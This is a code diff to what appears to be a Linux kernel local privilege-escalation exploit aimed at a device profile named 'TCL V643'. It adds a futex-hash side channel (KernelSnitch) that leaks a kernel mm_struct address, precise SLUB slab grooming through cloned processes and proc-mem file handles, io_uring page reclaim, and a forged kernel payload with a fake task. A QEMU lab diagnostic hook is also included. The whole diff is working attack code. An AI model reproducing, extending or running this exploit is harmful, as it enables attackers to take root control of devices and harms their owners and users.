@@ -62,6 +62,61 @@ static struct mm_ctx pre_ctx;
 static struct mm_ctx post_ctx;
 static pid_t child_leak;
 
+/* Exact TCL positional batch.  SLUB freelist randomization means an object's
+ * address slot is not its allocation ordinal.  The 15 allocations before
+ * the leak + leak + 16 after form a 32-object window that necessarily
+ * contains the leak's complete 16-object slab for every possible ordinal.
+ * Prefix/suffix positions separated by exactly 16 allocations necessarily
+ * belong to distinct slabs, independent of the unknown phase. */
+#define TCL_PREFIX_CHILDREN (16 * 16 + 15)
+#define TCL_LEAK_POS TCL_PREFIX_CHILDREN
+#define TCL_SUFFIX_CHILDREN (15 + 8 * 16)
+#define TCL_TOTAL_CHILDREN \
+  (TCL_PREFIX_CHILDREN + 1 + TCL_SUFFIX_CHILDREN)
+static struct mm_ctx tcl_ctx;
+
+#if defined(TCL_V643_LAB_ARMING) && TCL_V643_LAB_ARMING
+struct tcl_qemu_pid_mm_diag {
+  int32_t pid;
+  uint32_t is_slab;
+  uint64_t mm_kva, slab_pfn;
+  uint32_t slab_order, object_offset;
+};
+#define TCL_QEMU_IOC_MAGIC 0x47
+#define TCL_QEMU_PID_MM_DIAG \
+  _IOWR(TCL_QEMU_IOC_MAGIC, 4, struct tcl_qemu_pid_mm_diag)
+static void tcl_qemu_leak_diag(pid_t pid) {
+  if (!env_flag("TCL_QEMU_OBSERVER_DIAG", 0)) return;
+  int fd = open("/dev/glqemu-root", O_RDONLY);
+  if (fd < 0) {
+    pr_warning("TCL QEMU diag: observer open errno=%d\n", errno);
+    return;
+  }
+  struct tcl_qemu_pid_mm_diag q = {.pid = pid};
+  if (ioctl(fd, TCL_QEMU_PID_MM_DIAG, &q) == 0) {
+    pr_info("TCL QEMU diag only: true_mm=%016llx pfn=%llx order=%u off=%x\n",
+            (unsigned long long)q.mm_kva,
+            (unsigned long long)q.slab_pfn, q.slab_order, q.object_offset);
+    static const uint32_t hs[] = {64, 128, 256, 512, 1024, 2048, 4096};
+    for (size_t h = 0; h < sizeof(hs)/sizeof(hs[0]); h++) {
+      int matches = 0;
+      uint32_t want = __futex_hash_with_mm(
+          ks->futex_addrs[0], (size_t)q.mm_kva, hs[h]);
+      for (size_t i = 1; i < ks->collisions; i++)
+        matches += __futex_hash_with_mm(
+            ks->futex_addrs[i], (size_t)q.mm_kva, hs[h]) == want;
+      pr_info("TCL QEMU diag: hashsize=%u collision_matches=%d/%zu\n",
+              hs[h], matches, ks->collisions - 1);
+    }
+  } else {
+    pr_warning("TCL QEMU diag: PID_MM errno=%d\n", errno);
+  }
+  close(fd);
+}
+#else
+static void tcl_qemu_leak_diag(pid_t pid) { (void)pid; }
+#endif
+
 uintptr_t page_base;
 uintptr_t last_mm_struct;
 uintptr_t fake_lock;
@@ -849,6 +904,11 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   uintptr_t write_left = fake_left;
   uint64_t waiter_task = fake_task;
   uint64_t task_group = text_addr(ROOT_TASK_GROUP);
+#if defined(TCL_V643_LAB_ARMING) && TCL_V643_LAB_ARMING
+  const char *lab_tg = getenv("TCL_QEMU_ROOT_TASK_GROUP");
+  if (lab_tg && lab_tg[0])
+    task_group = strtoull(lab_tg, NULL, 0);
+#endif
   /* pi_top_task must equal fake_task so rt_mutex_setprio(fake_task,
    * pi_task=fake_task) takes the early "nothing changed" exit before it
    * ever touches p->stack/thread_info/rq (which our fake_task lacks). */
@@ -1089,7 +1149,204 @@ static int reclaim_one_uring(int tag) {
   return reclaim_one_uring_size(tag, 256);
 }
 
+static void tcl_release_urings(void) {
+  for (int i = 0; i < uring_count && i < URING_MAX; i++) {
+    if (uring_maps[i] && uring_maps[i] != MAP_FAILED)
+      munmap(uring_maps[i], uring_mapsz[i] ? uring_mapsz[i] : MM_SLAB_SIZE);
+    if (uring_fds[i] > 2)
+      close(uring_fds[i]);
+    uring_maps[i] = NULL;
+    uring_mapsz[i] = 0;
+    uring_mapstride[i] = 0;
+    uring_fds[i] = -1;
+  }
+  for (int i = uring_count; i < URING_MAX; i++)
+    uring_fds[i] = -1;
+  uring_count = 0;
+  uring_fd = -1;
+  uring_sqes = NULL;
+}
+
+static void tcl_cleanup_ctx(void) {
+  if (!tcl_ctx.childs || !tcl_ctx.memfds) return;
+  for (size_t i = 0; i < tcl_ctx.mm_cnt; i++) {
+    if (tcl_ctx.childs[i] > 0) {
+      kill_child(tcl_ctx.childs[i]);
+      tcl_ctx.childs[i] = 0;
+    }
+    if (tcl_ctx.memfds[i] >= 0) {
+      close(tcl_ctx.memfds[i]);
+      tcl_ctx.memfds[i] = -1;
+    }
+  }
+  free_ctx_storage(&tcl_ctx);
+}
+
+static int tcl_release_mm_position(size_t pos) {
+  if (pos >= tcl_ctx.mm_cnt || tcl_ctx.childs[pos] <= 0 ||
+      tcl_ctx.memfds[pos] < 0)
+    return 0;
+  kill_child(tcl_ctx.childs[pos]);
+  tcl_ctx.childs[pos] = 0;
+  close(tcl_ctx.memfds[pos]);
+  tcl_ctx.memfds[pos] = -1;
+  return 1;
+}
+
+static uintptr_t tcl_kernelsnitch_bruteforce(void) {
+  const uint32_t hash_sizes[] = {1024, 512, 256, 128, 64, 2048, 4096};
+  uintptr_t start = active_offsets->kernelsnitch_identity_start;
+  uintptr_t end = active_offsets->kernelsnitch_identity_end;
+  if (!start || end <= start || ks->collisions < 2) return (uintptr_t)-1;
+
+  /* V643's live direct map spans only 3 GiB: 3,145,728 candidates at the
+   * exact 1024-byte mm_cache stride.  A single deterministic scan avoids
+   * the generic worker range/alignment race seen in the QEMU gate. */
+  for (size_t h = 0; h < sizeof(hash_sizes)/sizeof(hash_sizes[0]); h++) {
+    uint32_t hs = hash_sizes[h];
+    for (uintptr_t candidate = start; candidate < end;
+         candidate += MM_STRUCT_SZ) {
+      uint32_t want = __futex_hash_with_mm(
+          ks->futex_addrs[0], candidate, hs);
+      int match = 1;
+      for (size_t i = 1; i < ks->collisions; i++) {
+        if (__futex_hash_with_mm(ks->futex_addrs[i], candidate, hs) != want) {
+          match = 0;
+          break;
+        }
+      }
+      if (match) {
+        pr_info("TCL KernelSnitch: mm=%016zx hashsize=%u\n",
+                candidate, hs);
+        ks->mm_struct = candidate;
+        ks->found = 1;
+        ks->state = KERNELSNITCH_MM_FOUND;
+        return candidate;
+      }
+    }
+  }
+  ks->state = KERNELSNITCH_MM_NOT_FOUND;
+  return (uintptr_t)-1;
+}
+
+/* Exact V643 reclaim with no PFN observer.  The tight clone burst is indexed
+ * relative to the one KernelSnitch-leaked object.  Its object offset gives
+ * the target slab boundary; all frees are then made by closing proc-mem
+ * references in this pinned task, so SLUB and PCP work runs on CORE. */
+static uintptr_t prepare_kernel_page_tcl(int payload_mode) {
+  tcl_cleanup_ctx();
+  tcl_release_urings();
+  close_reclaim_sockets();
+  free(skb_buf);
+  skb_buf = NULL;
+  g_skb_reclaim = 0;
+  pin_to_core(CORE);
+  mm_objs_per_slab = MM_SLAB_SIZE / MM_STRUCT_SZ;
+  if (mm_objs_per_slab != 16) {
+    errno = EPROTO;
+    return 0;
+  }
+
+  skb_buf = malloc(SKB_SEND_SIZE);
+  if (!skb_buf) return 0;
+  memset(skb_buf, 0, SKB_SEND_SIZE);
+  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+  ks = kernelsnitch_setup(MM_STRUCT_SZ, MM_ORDER, cpu_count,
+                          KSNITCH_COLLISIONS,
+                          env_int_range("KSNITCH_VERBOSE", 0, 0, 1), 0);
+  if (!ks) goto fail;
+
+  tcl_ctx.mm_cnt = TCL_TOTAL_CHILDREN;
+  tcl_ctx.childs = calloc(tcl_ctx.mm_cnt, sizeof(*tcl_ctx.childs));
+  tcl_ctx.memfds = malloc(tcl_ctx.mm_cnt * sizeof(*tcl_ctx.memfds));
+  if (!tcl_ctx.childs || !tcl_ctx.memfds) goto fail;
+  for (size_t i = 0; i < tcl_ctx.mm_cnt; i++) tcl_ctx.memfds[i] = -1;
+
+  /* No logging, proc opens or allocator work may be inserted into this
+   * burst: clone() is the only operation that allocates the indexed mms. */
+  for (size_t pos = 0; pos < tcl_ctx.mm_cnt; pos++) {
+    tcl_ctx.childs[pos] =
+        pos == TCL_LEAK_POS ? clone_leak_child() : clone_child();
+    if (tcl_ctx.childs[pos] <= 0) goto fail;
+  }
+  /* Open proc-mem only after the final fork.  Each fd pins its mm until the
+   * coordinator closes that exact position during the free choreography. */
+  for (size_t pos = 0; pos < tcl_ctx.mm_cnt; pos++) {
+    tcl_ctx.memfds[pos] = open_memfd(tcl_ctx.childs[pos]);
+    if (tcl_ctx.memfds[pos] < 0) goto fail;
+  }
+
+  for (int waited = 0;
+       ks->state == KERNELSNITCH_INIT && waited < 120000; waited++)
+    usleep(1000);
+  if (!kernelsnitch_found_collisions(ks)) {
+    pr_warning("TCL reclaim: KernelSnitch collision phase failed\n");
+    goto fail;
+  }
+  uintptr_t leaked = tcl_kernelsnitch_bruteforce();
+  tcl_qemu_leak_diag(tcl_ctx.childs[TCL_LEAK_POS]);
+  if (leaked == (uintptr_t)-1 ||
+      ((leaked & (MM_SLAB_SIZE - 1)) % MM_STRUCT_SZ) != 0) {
+    pr_warning("TCL reclaim: invalid mm leak 0x%zx\n", leaked);
+    goto fail;
+  }
+  last_mm_struct = leaked;
+  uintptr_t base = leaked & ~(MM_SLAB_SIZE - 1);
+  size_t slot = (leaked - base) / MM_STRUCT_SZ;
+  size_t target_window_start = TCL_LEAK_POS - 15;
+  size_t target_window_end = TCL_LEAK_POS + 16;
+  if (target_window_start < 16 * 16 ||
+      target_window_end + 1 + 7 * 16 >= tcl_ctx.mm_cnt) {
+    pr_warning("TCL reclaim: positional window out of range\n");
+    goto fail;
+  }
+  if (!prepare_skb_payload(base, payload_mode)) goto fail;
+  pr_info("TCL reclaim: mm=%016zx slab=%016zx address-slot=%zu "
+          "robust-window=%zu..%zu\n",
+          leaked, base, slot, target_window_start, target_window_end);
+
+  /* Establish nr_partial >= min_partial with sixteen distinct, non-empty
+   * slabs.  Fixed 16-allocation spacing does not require phase recovery. */
+  for (int group = 0; group < 16; group++) {
+    size_t pos = (size_t)group * 16;
+    if (!tcl_release_mm_position(pos)) goto fail;
+  }
+  /* Empty the complete leaked slab despite the randomized freelist.  The
+   * 32-wide window can empty one adjacent controlled slab too; all resulting
+   * order-2 pages are harmlessly covered by the interleaved ring spray. */
+  for (size_t pos = target_window_start; pos <= target_window_end; pos++)
+    if (!tcl_release_mm_position(pos)) goto fail;
+
+  /* Each first free adds one pobject.  The fifth drain is the measured
+   * V643 discard point, but retain all eight interleaved ring pairs so the
+   * route tolerates a pre-existing CPU-partial phase without guessing it. */
+  for (int drain = 1; drain <= 8; drain++) {
+    size_t pos = target_window_end + 1 + (size_t)(drain - 1) * 16;
+    if (!tcl_release_mm_position(pos)) goto fail;
+    if (!reclaim_one_uring(6000 + drain)) goto fail;
+  }
+  kernelsnitch_cleanup(ks);
+  ks = NULL;
+  pr_info("TCL reclaim: exact ballast/target/drain complete, mappings=%d\n",
+          uring_count);
+  return base;
+
+fail:
+  if (ks) {
+    kernelsnitch_cleanup(ks);
+    ks = NULL;
+  }
+  tcl_cleanup_ctx();
+  tcl_release_urings();
+  free(skb_buf);
+  skb_buf = NULL;
+  return 0;
+}
+
 uintptr_t prepare_kernel_page(int payload_mode) {
+  if (active_offsets &&
+      active_offsets->reclaim_route == GHOST_RECLAIM_TCL_V643_EXACT)
+    return prepare_kernel_page_tcl(payload_mode);
   /* Independent safety barrier: even if analysis_only were accidentally
    * removed later, never run the Sabrina-specific SLUB/PCP choreography for
    * TCL until that route has its own measured profile. */
@@ -1815,7 +2072,7 @@ uintptr_t prepare_good_kernel_page(int payload_mode) {
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
     max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
   } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
-    max_attempts = env_int_range("FOPS_MAX_ATTEMPTS", 24, 4, 72);
+    max_attempts = env_int_range("FOPS_MAX_ATTEMPTS", 24, 1, 72);
   }
   struct timespec deadline;
   clock_gettime(CLOCK_MONOTONIC, &deadline);
